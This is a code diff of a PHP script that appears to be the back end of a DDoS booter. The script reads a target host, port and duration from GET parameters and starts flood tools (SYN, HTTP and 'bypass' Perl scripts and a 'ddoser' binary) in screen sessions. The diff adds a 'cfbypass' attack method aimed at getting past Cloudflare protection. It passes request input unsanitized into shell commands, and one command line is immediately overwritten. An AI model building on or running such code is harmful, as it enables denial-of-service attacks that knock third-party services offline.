@@ -34,7 +34,7 @@ $method = $_GET['method'];
 $debug = isset($_GET['debug']) ? 1 : 0;
 
 $directory = "REPLACEME";
-$array = array("syn", "bypass", "http", "stop", "update", "stopall");
+$array = array("syn", "bypass", "http", "cfbypass", "stop", "update", "stopall");
 $ray = array("b387c979321e6360bc9a3a28fe83eb76");
 
 
@@ -118,7 +118,7 @@ if ($method == "syn") {
 if ($method == "bypass") {
     $command = "screen -dm perl $directory/bypass.pl $host $time";
 }
-if ($method == "http") {
+if ($method == "http" or $method == "cfbypass") {
     if (substr($host, 0, 4) !== "http") {
         if ($port === 443) {
             $host = "https://$host";
@@ -126,7 +126,13 @@ if ($method == "http") {
             $host = "http://$host";
         }
     }
-    $command = "screen -dm perl $directory/http.pl $host $port 50 500 $time";
+    if ($method == "cfbypass") {
+        $command = "screen -dm perl $directory/bypass.pl $host $time";
+        $command = "screen -dm $directory/ddoser run --url=$host:$port -w 500 -d " . $time . "s -f $directory/https.txt";
+    }
+    if ($method == "http") {
+        $command = "screen -dm perl $directory/http.pl $host $port 50 500 $time";
+    }
 }
 if ($method == "stop") {
     $command = "pkill $host -f";
